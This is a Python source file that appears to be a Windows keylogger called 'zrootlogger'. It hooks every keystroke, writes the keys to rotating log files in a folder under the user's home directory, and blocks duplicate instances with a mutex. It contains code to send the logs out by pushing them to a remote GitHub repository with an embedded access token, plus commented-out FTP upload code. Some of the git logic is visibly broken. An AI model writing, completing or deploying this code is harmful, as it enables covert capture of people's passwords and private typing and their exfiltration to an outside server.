import socket
import os
import win32event
import win32api
import winerror
from dirsync import sync
import ftplib
import datetime
import logging
import logging.handlers
import keyboard



# get the user name as identifier
userName = str(socket.gethostname())


#For creating app dir
homePath = os.path.expanduser("~")
dirName = "zrootlogger"
dirPath = os.path.join(homePath, dirName)
if not os.path.exists(dirPath):
    os.makedirs(dirPath)
os. chdir(dirPath)



#disallowing multiple instance
mutex = win32event.CreateMutex(None, 1, 'mutex_var_xboz')
if win32api.GetLastError() == winerror.ERROR_ALREADY_EXISTS:
    mutex = None
    print ("Multiple Instance not Allowed")
    exit(0)
x=''
data=''
count=0

##############################################################################


# # Connect to the FTP server and login
# ftp = ftplib.FTP("ftp.example.com")
# ftp.login("username", "password")

# # Define the source and target paths
# source_path = dirPath
# target_path = "/remote/folder/path"

# # Sync the local folder with the remote folder using the "copy" option
# sync(source_path, target_path, "copy", ftp=ftp)

# # Close the FTP connection
# ftp.quit()

##############################################################################

import subprocess
import watchdog.events
import watchdog.observers

# Define your git username, personal access token, and repository name
username = "your_username"
token = "your_token"
repo_name = "your_repo_name"

# Define your local and remote repository paths
local_path = "/local/folder/path"
remote_path = f"https://github.com/{username}/{repo_name}"

# Define a handler class that inherits from FileSystemEventHandler
class GitHandler(watchdog.events.FileSystemEventHandler):
    # Define a method that is called when a file or directory is created
    def on_created(self, event):
        # Change directory to your local repository
        subprocess.run(["cd", local_path])
        # Add all files to the staging area
        subprocess.run(["git", "add", "."])
        # Commit your changes with a message
        subprocess.run(["git", "commit", "-m", "New file created"])
        # Push your changes to your remote repository using your username and token
        subprocess.run(["git", "push", f"https://{username}:{token}@{remote_path}"])

# Create an observer object
observer = watchdog.observers.Observer()

# Create a handler object
handler = GitHandler()

# Schedule the observer to watch the local directory for changes
observer.schedule(handler, local_path, recursive=True)

# Start the observer
observer.start()

##############################################################################

##for word count interval##

# define a custom handler class that inherits from FileHandler
class WordCountHandler(logging.FileHandler):
    # initialize the handler with the file name and the word limit
    def __init__(self, filename, mode='a', encoding=None, delay=False, word_limit=50):
        # call the parent constructor
        super().__init__(filename, mode, encoding, delay)
        # set the word limit attribute
        self.word_limit = word_limit
    # override the emit method
    def emit(self, record):
        # get the current log file content
        with open(self.baseFilename, 'r') as f:
            content = f.read()
        # split the content by whitespace and get the word count
        word_count = len(content.split())
        # check if the word count exceeds the limit or if this is the first log file
        if word_count >= self.word_limit:
            # close the current file
            self.close()
            # get the current date and time as a string
            now = datetime.datetime.now().strftime('-%Y-%m-%d-%H-%M-%S')
            # create a new file with a different name based on the date and time without the prefix
            self.baseFilename = f"log-"+userName+now+".txt"
            # open the new file in append mode
            self.stream = self._open()
        # call the parent emit method to write the record to the file
        super().emit(record)

# create a logger object
logger = logging.getLogger('my_app')
# set the logging level to INFO
logger.setLevel(logging.INFO)
# create a WordCountHandler object with a word limit of 50 and a filename of 'keylog.txt'
logHandler = WordCountHandler('log-'+userName+datetime.datetime.now().strftime('-%Y-%m-%d-%H-%M-%S')+".txt", word_limit=50)

##for word count interval##

############################################################################################

##for time interval##

# # create a logger object
# logger = logging.getLogger('my_app')
# # set the logging level to INFO
# logger.setLevel(logging.INFO)
# # create a TimedRotatingFileHandler object
# logHandler = logging.handlers.TimedRotatingFileHandler('log', when='S', interval=30, backupCount=5)
# # set the suffix for the rotated file name
# logHandler.suffix = userName+'-%Y-%m-%d-%H-%M-%S.txt'

##for time interval##

############################################################################################

# set the logging level to INFO
logHandler.setLevel(logging.INFO)
# create a formatter object
formatter = logging.Formatter('%(message)s')
# set the formatter for the handler
logHandler.setFormatter(formatter)
# add the handler to the logger
logger.addHandler(logHandler)


# define a callback function to process the keystrokes
def on_key_press(event):
    # get the name of the pressed key
    key = event.name
    # write the keystroke to the log file
    logger.info(key)

# hook the keyboard events with the callback function
keyboard.on_press(on_key_press)

# wait for keyboard events in a loop
keyboard.wait()
